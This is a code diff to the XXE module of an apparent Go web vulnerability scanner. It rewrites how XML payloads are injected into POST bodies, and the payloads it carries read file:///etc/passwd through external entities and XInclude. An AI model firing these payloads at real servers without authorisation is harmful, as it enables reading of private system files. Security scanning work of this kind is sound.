@@ -2,14 +2,16 @@ package xxe
 
 import (
 	"glint/fastreq"
+	"glint/logger"
 	"glint/plugin"
 	"glint/util"
+	"regexp"
 	"strings"
 
 	"github.com/thoas/go-funk"
 )
 
-var DefaultProxy = ""
+var DefaultProxy = "127.0.0.1:7777"
 var cert string
 var mkey string
 
@@ -24,6 +26,7 @@ var reverse_template = []string{
 
 func Xxe(args interface{}) (*util.ScanResult, error) {
 	var err error
+	// var blastIters interface{}
 	util.Setup()
 	group := args.(plugin.GroupData)
 	// ORIGIN_URL := `http://not-a-valid-origin.xsrfprobe-csrftesting.0xinfection.xyz`
@@ -62,13 +65,13 @@ func Xxe(args interface{}) (*util.ScanResult, error) {
 	// 	return nil, err
 	// }
 
-	// var xmlversion bool
-	// reg := `^\s*<\?xml`
-	// match, _ := regexp.MatchString(reg, string(body))
-	// if match {
-	// 	xmlversion = true
-	// }
-	// xmlversion_text := `<?xml version="1.0" encoding="UTF-8"?>`
+	var xmlversion bool
+	reg := `^\s*<\?xml`
+	match, _ := regexp.MatchString(reg, string(body))
+	if match {
+		xmlversion = true
+	}
+	xmlversion_text := `<?xml version="1.0" encoding="UTF-8"?>`
 	payloads := []string{
 		`<?xml version="1.0"?><!DOCTYPE ANY [<!ENTITY content SYSTEM "file:///etc/passwd">]><a>&content;</a>`,
 		`<?xml version="1.0" ?><root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///etc/passwd" parse="text"/></root>`,
@@ -115,10 +118,34 @@ func Xxe(args interface{}) (*util.ScanResult, error) {
 		// }
 
 	}
+
+	//<?xml version="1.0" encoding="utf-8"?>
+
 	if funk.Contains(ContentType, "application/xml") {
+
+		var pl_ string
+		if !xmlversion {
+			pl_ = xmlversion_text
+			logger.Debug(pl_)
+		}
+		// err := xml.Unmarshal([]byte(pl_), &blastIters)
+		// if err != nil {
+		// 	logger.Error("%v", err.Error())
+		// }
+
 		for _, pl := range win_pl {
 			if strings.ToUpper(method) == "POST" {
-				npl := append([]byte(pl), body...)
+				doc, err := util.ParseXMl(body)
+				if err != nil {
+					logger.Error("%v", err.Error())
+				}
+				newbody, err := doc.WriteToBytes()
+				if err != nil {
+					logger.Error("%v", err.Error())
+				}
+
+				newbody = []byte(strings.ReplaceAll(string(newbody), "&amp;content", "&content;"))
+				npl := append([]byte(pl), newbody...)
 				if strings.ToUpper(method) == "POST" {
 					req1, resp1, errs := sess.Post(url, headers, []byte(npl))
 					if errs != nil {
